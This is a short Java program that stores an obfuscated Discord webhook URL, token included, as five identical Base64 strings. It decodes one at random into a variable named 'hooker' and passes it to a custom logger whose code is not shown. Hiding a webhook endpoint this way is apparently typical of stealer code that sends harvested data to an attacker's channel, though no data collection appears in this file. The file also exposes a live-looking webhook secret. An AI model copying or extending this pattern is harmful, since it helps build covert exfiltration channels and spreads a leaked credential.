import logger.Logger;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;

public class Main {
	public static void main(String[] args) {
		List<String> strings = Arrays.asList(new String[] { "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMjU3NDI1MzE3MTI4MTk2Mi90LU00X2h3bDlEbkhFdlFGMllxalhmS0JidFBkeGNrSVA4ejdhMUFra2QzNm1ELUNtLUY3VFRRaXptOThUN0FOemtDbg==", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMjU3NDI1MzE3MTI4MTk2Mi90LU00X2h3bDlEbkhFdlFGMllxalhmS0JidFBkeGNrSVA4ejdhMUFra2QzNm1ELUNtLUY3VFRRaXptOThUN0FOemtDbg==", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMjU3NDI1MzE3MTI4MTk2Mi90LU00X2h3bDlEbkhFdlFGMllxalhmS0JidFBkeGNrSVA4ejdhMUFra2QzNm1ELUNtLUY3VFRRaXptOThUN0FOemtDbg==", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMjU3NDI1MzE3MTI4MTk2Mi90LU00X2h3bDlEbkhFdlFGMllxalhmS0JidFBkeGNrSVA4ejdhMUFra2QzNm1ELUNtLUY3VFRRaXptOThUN0FOemtDbg==", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMjU3NDI1MzE3MTI4MTk2Mi90LU00X2h3bDlEbkhFdlFGMllxalhmS0JidFBkeGNrSVA4ejdhMUFra2QzNm1ELUNtLUY3VFRRaXptOThUN0FOemtDbg==" });
		Object hooker = new String(Base64.getDecoder().decode(((String) ((List<?>) strings).get((new Random()).nextInt(5))).getBytes(StandardCharsets.UTF_8)));
		strings.forEach(System.out::println);
		Logger.debug(hooker);
	}
}